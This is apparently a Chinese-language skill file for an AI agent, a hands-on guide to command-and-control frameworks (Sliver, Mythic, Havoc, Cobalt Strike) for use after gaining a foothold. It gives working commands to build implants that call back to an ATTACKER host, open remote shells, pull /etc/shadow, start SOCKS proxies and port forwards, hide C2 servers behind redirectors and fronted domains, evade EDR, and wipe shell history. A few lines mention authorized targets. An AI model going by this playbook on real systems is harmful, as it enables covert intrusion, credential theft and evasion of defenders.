---
name: c2-framework
description: C2 框架选型与实操：Sliver / Mythic / Havoc / CS 对比，listener 搭建、implant 生成、会话管理、流量伪装、重定向与灾备
whenToUse: 已获得初始立足点，需要稳定回连、多会话管理与后渗透编排
role: internal
enabled: true
---

# C2 框架

## 一、选型（先定框架，再谈流量）

| 框架 | 协议 | 成本 | 适用 |
|---|---|---|---|
| **Sliver** | mTLS / WG / HTTP(S) / DNS | 开源免费 | 默认首选，Go 编译单文件，交叉编译强 |
| **Mythic** | 多 agent 插件化 | 开源免费 | 需要多 agent 混用、Web UI 编排 |
| **Havoc** | HTTPS / SMB | 开源免费 | 需要 sleep mask、内存规避 |
| **Cobalt Strike** | 多 | 商业 | 授权靶标且客户提供 license 时 |

判定：**默认 Sliver**。理由——单二进制、内置 arm64/x64 交叉编译、mTLS 默认加密、有 `armory` 扩展生态。

## 二、Sliver 搭建

```bash
# 安装（本机）
curl -sL https://sliver.sh/install | sudo bash     # 或下 release 二进制
sliver-server

# 服务端启动后进入交互
[server] sliver > jobs
```

生成 implant：

```bash
# mTLS（默认，最稳）
sliver > generate --mtls ATTACKER:8888 --os linux --arch amd64 --save /tmp/imp

# HTTPS（过代理友好）
sliver > https --lhost ATTACKER --lport 443 --domain cdn.example.com
sliver > generate --https ATTACKER:443 --os windows --arch amd64 --format exe

# WireGuard（性能最好）
sliver > wg --lport 51820
sliver > generate --wg ATTACKER:51820 --os linux

# DNS（最隐蔽，最慢）
sliver > dns --domains c2.example.com --canaries 2
```

会话操作：

```bash
sliver > sessions                    # 列出
sliver > use SESSION_ID
[session] sliver > info
[session] sliver > shell             # 交互式 shell
[session] sliver > execute -o whoami
[session] sliver > download /etc/shadow
[session] sliver > upload /tmp/tool /tmp/tool
[session] sliver > socks5 start --port 1080     # 起 SOCKS 代理
[session] sliver > portfwd add --remote 10.0.0.5:3389
```

## 三、Mythic（多 agent 场景）

```bash
# Docker 部署
git clone https://github.com/its-a-feature/Mythic && cd Mythic
./install_docker_debian.sh && ./mythic-cli start

# 装 agent（Apollo=Windows，Poseidon=Linux）
./mythic-cli install github https://github.com/MythicAgents/Apollo
./mythic-cli install github https://github.com/MythicAgents/Poseidon

# Web UI: https://127.0.0.1:7443  admin/<密码见 .env>
```

判定：需要「同一套 UI 管 Windows+Linux+macOS」时才上 Mythic，单平台用 Sliver 更省。

## 四、Havoc（内存规避强）

```bash
git clone https://github.com/HavocFramework/Havoc && cd Havoc
make && ./havoc server --profile profiles/havoc.yaotl -v
# Client 需图形环境
```

要点：Havoc 的 Demon agent 默认带 sleep mask、间接 syscall、堆加密。**仅在授权靶标且需要验证 EDR 规避时使用**。

## 五、流量伪装（决定能活多久）

```bash
# 1. 域名前置：C2 域名必须是「看起来正常」的子域
#    cdn.example.com / api.example.com / img.example.com

# 2. 重定向器（保护真实 C2 IP）
#    nginx 反代 + 只放行特定 UA/URI
server {
    listen 443 ssl;
    server_name cdn.example.com;
    location /api/v1/health {
        proxy_pass https://REAL_C2:443;
        proxy_ssl_verify off;
    }
    location / { return 404; }
}

# 3. CDN 前置（Cloudflare → 真实 C2 的 worker 中转）

# 4. 端口选择：443/80/53 最不显眼；避开 4444/1337/8080
```

Sliver 侧配 redirector：

```bash
sliver > https --lhost REAL_C2 --lport 443 --domain cdn.example.com \
  --website cdn.example.com --cert /path/fullchain.pem --key /path/privkey.pem
```

## 六、灾备与 OPSEC

```bash
# 1. 多 listener 冗余（一个被打掉还有备用）
sliver > mtls --lhost ATTACKER --lport 8888
sliver > wg --lport 51820

# 2. beacon 而非 session（断线自动重连）
sliver > generate beacon --mtls ATTACKER:8888 --seconds 60 --jitter 30

# 3. 清理痕迹
[session] sliver > rm /tmp/imp
[session] sliver > shell
  history -c; unset HISTFILE
```

OPSEC 铁律：

- **不在一台 C2 上跑所有目标**——按 engagement 隔离
- beacon interval ≥ 60s + jitter ≥ 30%，别用 1s 心跳
- 不在工作日 9-18 点做高频操作（对齐目标时区）
- 每次操作前问：这条命令会在目标留什么日志？

## 七、判定纪律

| 现象 | 判定 |
|---|---|
| implant 回连成功 | C2 通道成立 |
| 能执行命令但无回显 | 通道受限，不等于失败，改用文件回传 |
| beacon 掉线 | 先查 redirector 与证书，别急着换框架 |
| SOCKS 起得来但内网不通 | 目标侧出网策略限制，不是 C2 问题 |

**Crash 后先看 `sliver-server` 日志与 `jobs`，不要重装。**
